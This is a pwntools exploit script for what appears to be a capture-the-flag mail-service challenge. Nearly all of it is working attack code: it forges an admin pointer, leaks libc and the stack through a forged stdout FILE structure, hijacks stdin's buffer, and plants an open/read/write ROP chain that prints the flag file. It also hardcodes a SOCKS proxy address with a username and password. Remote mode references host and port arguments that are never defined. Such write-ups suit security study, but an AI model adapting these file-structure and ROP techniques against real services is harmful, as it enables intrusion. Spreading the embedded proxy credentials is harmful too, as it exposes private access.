import argparse
import sys
import socks  
from time import sleep
import re
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument(
    "mode",
    type=int,
    choices=[0, 1, 2],
    nargs="?",
    default=0,
    help="0=local, 1=local+gdb, 2=remote",
)

parser.add_argument("--socks", type=str, default="2.dart.ccsssc.com:26768", help="SOCKS proxy")
parser.add_argument("--socksuser", type=str, default="czi1f8vx", help="SOCKS username")
parser.add_argument("--sockspass", type=str, default="2oubcjw5", help="SOCKS password")
parser.add_argument("--delta", type=lambda x: int(str(x), 0), default=0x1B8, help="login_ret offset delta") # delta用于远程leak stack调整参数爆破
args = parser.parse_args()

filename = "./pwn"
libc_name = "./libc.so.6"
LD = "./ld-linux-x86-64.so.2"
arch = "amd64"

context(log_level="debug", os="linux", arch=arch)
if args.mode < 2:
    context.terminal = ["tmux", "splitw", "-h"]

def VIO_TEXT(x, code=95):
    log.info(f"\x1b[{code}m{x}\x1b[0m")

def CLEAR_TEXT(x, code=32):
    log.success(f"\x1b[{code}m{x}\x1b[0m")

elf = ELF(filename, checksec=False)
libc = ELF(libc_name, checksec=False)

if args.mode == 0:
    io = process([LD, "--library-path", ".", filename])
    CLEAR_TEXT("[*] Running on local machine with custom libc")
elif args.mode == 1:
    io = process([LD, "--library-path", ".", filename])
    gdb.attach(io, gdbscript='''
        # put your scripts here
        c
    ''')
    CLEAR_TEXT("[*] Running local with GDB")
elif args.mode == 2:
    if args.socks:
        proxy_host, proxy_port = args.socks.split(":", 1)
        sock = socks.socksocket()
        sock.set_proxy(
            socks.SOCKS5,
            proxy_host,
            int(proxy_port),
            username=args.socksuser,
            password=args.sockspass,
        )
        sock.connect((args.host, args.port))
        io = remote.fromsocket(sock)
        CLEAR_TEXT(f"[*] Connected to remote {args.host}:{args.port} via SOCKS5 {args.socks}")
    else:
        io = remote(args.host, args.port)
        CLEAR_TEXT(f"[*] Connected to remote {args.host}:{args.port} directly")
else:
    sys.exit(1)


# user用户函数
def register(name, password):
    io.sendline(b"2")
    io.sendafter(b"Input your name: ", name + b"\n")
    io.sendafter(b"Input your password: ", password + b"\n")
    io.recvuntil(b"Your choice: ")

def login(name, password):
    io.sendline(b"1")
    io.sendafter(b"Input your name: ", name + b"\n")
    io.sendafter(b"Input your password: ", password + b"\n")
    return io.recvuntil(b"Your choice: ")

def write_draft(data):
    io.sendline(b"1")
    io.sendafter(b"(1-256): ", str(len(data)).encode() + b"\n")
    io.sendafter(b"bytes):\n", data)
    io.recvuntil(b"Your choice: ")

def send_mail(uid, overwrite=True):
    io.sendline(b"3")
    io.sendafter(b"1-12)", str(uid).encode() + b"\n")
    out = io.recvuntil((b"Overwrite? (y/n): ", b"Your choice: "))
    if b"Overwrite?" in out:
        io.sendline(b"y" if overwrite else b"n")
        out += io.recvuntil(b"Your choice: ")
    return out

def logout_user():
    io.sendline(b"4")
    io.recvuntil(b"Your choice: ")


# admin用户函数
def admin_change(uid, field, value):
    io.sendline(b"1")
    io.sendafter(b"Enter user ID to modify (1-12): ", str(uid).encode() + b"\n")
    io.recvuntil(b"Your choice: ")
    io.sendline(str(field).encode())
    prompt = b"Enter new username: " if field == 1 else b"Enter new password: "
    io.sendafter(prompt, value + b"\n")
    io.recvuntil(b"Your choice: ")

def admin_forward(src, dst, choose):
    io.sendline(b"4")
    io.sendafter(b"Enter source user ID (whose mail to forward): (1-12) ", str(src).encode() + b"\n")
    io.sendafter(b"Enter destination user ID (1-12): ", str(dst).encode() + b"\n")
    out = io.recvuntil((b"Your choice: ", b"Overwrite? (y/n): "))
    if b"Overwrite?" in out:
        io.sendline(b"y")
        out += io.recvuntil(b"Your choice: ")
    if b"Which mail would you like to forward?" in out:
        io.sendline(str(choose).encode())
        out += io.recv()
    return out

def logout_admin():
    io.sendline(b"5")
    io.recvuntil(b"Your choice: ")

def read_user_inbox(user, password):
    login(user, password)
    io.sendline(b"2")
    io.recvuntil(b"Your choice: ")
    io.sendline(b"2")
    out = io.recvuntil(b"Your choice: ")
    io.sendline(b"3")
    io.recvuntil(b"Your choice: ")
    logout_user()
    return out

def relogin_admin():
    login(b"\x00", b"\x00")


# payload
def leak_libc():
    admin_change(1, 1, b"nan0in") #恢复一个用户用于使用
    admin_change(1, 2, b"nan0in")
    admin_forward(-3, 1, 1) #写出stdout
    logout_admin()
    out = read_user_inbox(b"nan0in", b"nan0in")
    relogin_admin()
    leak = out.split(b"Inbox (new mail):\n", 1)[1].split(b"\n\nWhat would", 1)[0]
    return u64(leak.ljust(8, b"\x00")) - libc.symbols["_IO_2_1_stdout_"] - 0x83

def leak_qword_via_stdout(addr):
    payload=flat(
        { 
        0x00:0xfbad1800,
        0x20:addr,
        0x28:addr + 8,
        0x30:addr + 8,
        },
        filler=b"\x00",length=0x60
    )

    logout_admin()
    login(b"nan0in", b"nan0in")
    write_draft(payload)
    logout_user()
    relogin_admin()

    io.sendline(b"4")
    io.sendafter(b"Enter source user ID (whose mail to forward): (1-12) ", b"1\n")
    io.sendafter(b"Enter destination user ID (1-12): ", b"-7\n")
    io.recvuntil(b"Your choice: ")
    io.sendline(b"1")

    leak = io.recvn(8)
    io.recv()
    return u64(leak)

def build_stdin_payload(libc_base, target, reserve):
    stdin_addr = libc_base + libc.symbols["_IO_2_1_stdin_"]
    payload=flat([
        0xFBAD208B,           # 0x00: _flags (Magic number)
        target,               # 0x08: _IO_read_ptr
        target,               # 0x10: _IO_read_end
        target,               # 0x18: _IO_read_base
        stdin_addr + 0x83,    # 0x20: _IO_write_base
        stdin_addr + 0x83,    # 0x28: _IO_write_ptr
        stdin_addr + 0x83,    # 0x30: _IO_write_end
        target,               # 0x38: _IO_buf_base (劫持写入的目标地址)
        target + reserve      # 0x40: _IO_buf_end  (允许写入的结束地址)
    ])
    return payload

def orw(chain_base, libc_base):
    pop_rdi = libc_base + 0x2a3e5
    pop_rsi = libc_base + 0x2be51
    pop_rdx_r12 = libc_base + 0x11f357
    pop_rax = libc_base + 0x45eb0
    syscall_ret = libc_base + 0x91316

    rop_len = 360 # 45*8
    flag1 = chain_base + rop_len
    flag2 = flag1 + len(b"flag\x00")
    buf = flag2 + len(b"/flag\x00") + 0x10

    payload=flat(
        pop_rax, 2, pop_rdi, flag1, pop_rsi, 0, pop_rdx_r12, 0, 0, syscall_ret,       # open，两个路径都开一下
        pop_rax, 2, pop_rdi, flag2, pop_rsi, 0, pop_rdx_r12, 0, 0, syscall_ret,       # open
        pop_rax, 0, pop_rdi, 3, pop_rsi, buf, pop_rdx_r12, 0x100, 0, syscall_ret,   # read
        pop_rax, 1, pop_rdi, 1, pop_rsi, buf, pop_rdx_r12, 0x100, 0, syscall_ret,   # write
        pop_rax, 60, pop_rdi, 0, syscall_ret,                                     # exit
        b"flag\x00/flag\x00".ljust(0x18, b"\x00"),
    )

    return payload

def blind_prep(stdin_payload):
    blob = b"5\n"
    blob += b"1\n" + b"nan0in\n" + b"nan0in\n"
    blob += b"1\n" + str(len(stdin_payload)).encode() + b"\n" + stdin_payload
    blob += b"4\n"
    blob += b"1\n" + b"\x00\n" + b"\x00\n"
    blob += b"4\n1\n-5\ny\n1\n"
    return blob


def solve():
    io.recvuntil(b"Your choice: ")

    # 拿admin
    for id in range(1, 13):
        name = f"u{id}".encode()
        password = f"p{id}".encode()
        register(name, password)
        login(name, password)
        
        for _ in range(10):
            write_draft(b"hijack to admin")
            out = send_mail(id, True)
            if b"Risk detected" in out:
                VIO_TEXT(f"-->Banned user {id}")
                break
        
        if b"Your choice: " not in out:
            io.recvuntil(b"Your choice: ")

    register(b"hijack", b"hijack")
    # pause()
    CLEAR_TEXT(f"Admin pointer successfully overwritten via user {id}")

    login(b"\x00", b"\x00") #注意admin的name和password偏移检测和user不一样，所以只能\x00登录
    CLEAR_TEXT("Logged in as admin successfully")

    libc_base = leak_libc()
    CLEAR_TEXT(f"Libc Base: {hex(libc_base)}")
    environ_ptr = leak_qword_via_stdout(libc_base + libc.symbols["environ"])     # Leak Stack
    CLEAR_TEXT(f"Environ Address: {hex(environ_ptr)}")
    pause()

    login_ret = environ_ptr - 0x1b8
    final_stage = orw(login_ret, libc_base)
    stdin_payload = build_stdin_payload(libc_base, login_ret - 2, max(0x800, len(final_stage) + 0x40))

    VIO_TEXT("Sending blind preparation & ORW trigger...")
    io.send(blind_prep(stdin_payload))
    sleep(0.2)
    io.recv()
    
    io.send(b"5\n" + final_stage + b"\n")
    data = io.recvall()

    if b"flag{" in data or b"dart{" in data:
        CLEAR_TEXT(f"Flag found: {re.search(b'(dart|flag)\\{.*?\\}', data).group(0).decode()}")


if __name__ == "__main__":
    solve()
    io.interactive()
